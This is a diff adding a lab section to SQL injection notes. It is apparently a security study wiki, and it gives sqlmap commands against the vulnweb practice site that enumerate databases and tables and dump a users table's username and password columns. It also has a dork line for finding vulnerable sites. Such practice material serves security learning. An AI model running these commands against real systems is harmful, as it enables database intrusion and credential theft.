@@ -149,6 +149,34 @@ select * from user;
 * **MyBatis**: MyBatis is a Java persistence framework that includes a built-in SQL Injection scanner.
 * **Blisqy**: Blisqy is a tool to aid Web Security researchers to find Time-based Blind SQL injection on HTTP Headers and also exploitation of the same vulnerability.
 
+## Lab - Example of use
+
+### **SQLMap**
+
+site:[http://testphp.vulnweb.com/](http://testphp.vulnweb.com/) php?= (for finding vulnerable site)
+
+(for cookies- console->document.cookie)
+
+&#x20;
+
+sqlmap -u [http://testphp.vulnweb.com/artists.php?artist=1](http://testphp.vulnweb.com/artists.php?artist=1)  --dbs   (databases)
+
+sqlmap -u [http://testphp.vulnweb.com/artists.php?artist=1](http://testphp.vulnweb.com/artists.php?artist=1)  -D acuart –tables   (tables)
+
+sqlmap -u [http://testphp.vulnweb.com/artists.php?artist=1](http://testphp.vulnweb.com/artists.php?artist=1)  -D acuart -T users --columns   (columns)
+
+(dump whole table)
+
+sqlmap -u [http://testphp.vulnweb.com/artists.php?artist=1](http://testphp.vulnweb.com/artists.php?artist=1)  -D acuart -T users  --dump  &#x20;
+
+&#x20;                                                           OR                                                                                   &#x20;
+
+(dump individual  column data)
+
+sqlmap -u [http://testphp.vulnweb.com/artists.php?artist=1](http://testphp.vulnweb.com/artists.php?artist=1)  -D acuart -T users -C uname  --dump &#x20;
+
+sqlmap -u [http://testphp.vulnweb.com/artists.php?artist=1](http://testphp.vulnweb.com/artists.php?artist=1)  -D acuart -T users -C pass  --dump
+
 ## Additional Resources
 
 {% embed url="https://hackertarget.com/sqlmap-tutorial/" %}
